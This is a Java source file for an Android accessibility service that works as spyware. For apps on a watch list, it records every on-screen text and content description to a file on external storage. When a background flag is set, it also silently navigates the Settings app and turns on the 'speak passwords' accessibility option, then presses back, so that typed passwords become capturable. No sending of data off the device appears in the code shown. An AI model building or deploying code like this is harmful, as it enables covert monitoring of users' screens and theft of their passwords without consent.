package com.mobimagic.littlerabbit;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.List;

import org.w3c.dom.Text;

import android.accessibilityservice.*;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Resources;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;



public class MyAccessibilityService extends AccessibilityService {
	private static final boolean DEBUG = Utils.DEBUG;
	private static final String TAG = "xuxin";
	
	private final String SETTINGS_PACKAGE_NAME = "com.android.settings";
	
	private Context mSettingsContext;
    private Resources mSettingsRes;
    private int mSpeakPwdResId;
    private String mSpeakPwdStr;
    private int mSpeakPwdOnResId;
    private String mSpeakPwdOnStr;
    private Class<?> mClassType = null;
    private Method mGetIntMethod = null;
    private Context mContext;

	@Override
	public void onCreate() {
		super.onCreate();
		mContext = getApplicationContext();
	}

	@Override
	public void onAccessibilityEvent(final AccessibilityEvent event) {
		if (event == null || event.getSource() == null || TextUtils.isEmpty(event.getPackageName().toString())){
			return;
		}
		
		if (Utils.isAppInMonitorList(event.getPackageName().toString())) {
			printTree(event.getSource(), event.getPackageName().toString());
		}else if (event.getPackageName().equals("com.android.settings") 
				&& SharePref.getBoolean(mContext, SharePref.SAHREPREF_IS_BACKGROUND, false)){
			try {
				mSettingsContext = createPackageContext(SETTINGS_PACKAGE_NAME, Context.CONTEXT_INCLUDE_CODE
				        | Context.CONTEXT_IGNORE_SECURITY);
			} catch (NameNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
            mSettingsRes = mSettingsContext.getResources();
            mSpeakPwdResId = mSettingsRes.getIdentifier("accessibility_toggle_speak_password_preference_title", "string", SETTINGS_PACKAGE_NAME);
            mSpeakPwdStr = mSettingsRes.getString(mSpeakPwdResId);
            
            mSpeakPwdOnResId = mSettingsRes.getIdentifier("switch_on_text", "string", SETTINGS_PACKAGE_NAME);
            mSpeakPwdOnStr = mSettingsRes.getString(mSpeakPwdOnResId);
            
            final List<AccessibilityNodeInfo> spw_nodes = event.getSource().findAccessibilityNodeInfosByText(
            		mSpeakPwdStr);

            if (spw_nodes != null && !spw_nodes.isEmpty()) {
                AccessibilityNodeInfo parentNode = null;
				for (int i = 0; i < spw_nodes.size(); i++) {
					if (spw_nodes.get(i).getText().equals(mSpeakPwdStr)) {
						parentNode = spw_nodes.get(i).getParent();
						if (parentNode != null) {
							// find switcher node
							AccessibilityNodeInfo switchNodeInfo = null;
							for (int k = 0; k < parentNode.getChildCount(); k++) {
								if (parentNode.getChild(k).getClassName()
										.equals("android.widget.Switch")) {
									switchNodeInfo = parentNode.getChild(k);
								}
							}
							if (parentNode.getClassName().equals(
									"android.widget.LinearLayout")) {
								if (parentNode.isEnabled()) {
									if (switchNodeInfo != null
											&& !isSpeakPwdEnable(switchNodeInfo)) {
										if (DEBUG){
											Log.d(TAG, "hit speakpassword");
										}
										parentNode.performAction(getInt("ACTION_CLICK",0x00000010));
									}
									performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
									break;
								}
							}
						}
					}
                }
            }else{
            	event.getSource().performAction(getInt("ACTION_SCROLL_FORWARD", 0x00001000));
            }
		}
	}
	
    private int getInt(String key, int def) {
        try {
            if (mClassType == null) {
                mClassType = Class.forName("android.view.accessibility.AccessibilityNodeInfo");
                mGetIntMethod = mClassType.getDeclaredMethod("getInt", String.class, int.class);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        int value = def;
        try {
            Integer v = (Integer) mGetIntMethod.invoke(mClassType, key, def);
            value = v.intValue();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return value;
    }

	private void printTree(final AccessibilityNodeInfo info, final String pname){
		if (info == null){
			return;
		}
		
		if (info.getChildCount() > 0){
			for(int i=0; i<info.getChildCount(); i++){
				printTree(info.getChild(i), pname);
			}
		}else{
			if (!TextUtils.isEmpty(info.getText())){
				if (DEBUG){
				    Log.d(TAG, "tx:"+info.getText()+" n:"+info.getContentDescription());
				}
			    writeLogtoFile(pname+":"+info.getText().toString());
			}else if(!TextUtils.isEmpty(info.getContentDescription())){
				if (DEBUG){
				    Log.d(TAG, "tx:"+info.getText()+" n:"+info.getContentDescription());
				}
				writeLogtoFile(pname+":"+info.getContentDescription().toString());
			}
		}
		
	}
	
	@Override
	public void onInterrupt() {

	}

	private static void writeLogtoFile(String text) {
        File file = new File(Environment.getExternalStorageDirectory(), Utils.SD_FILE_NAME); 
        try {  
            FileWriter filerWriter = new FileWriter(file, true);
            BufferedWriter bufWriter = new BufferedWriter(filerWriter);  
            bufWriter.write(text);  
            bufWriter.newLine();  
            bufWriter.close();  
            filerWriter.close();  
        } catch (IOException e) {  
            // TODO Auto-generated catch block  
            e.printStackTrace();  
        }  
    }  
	
	private boolean isSpeakPwdEnable(AccessibilityNodeInfo node){
		boolean ret = false;
		if (!TextUtils.isEmpty(mSpeakPwdOnStr)){
			Log.d(TAG, "node str:"+node.getText()+" mSpeakPwdOnStr:"+mSpeakPwdOnStr);
			if (mSpeakPwdOnStr.equalsIgnoreCase(node.getText().toString())){
				ret = true;
			}
		}		
		return ret;	
	}
}
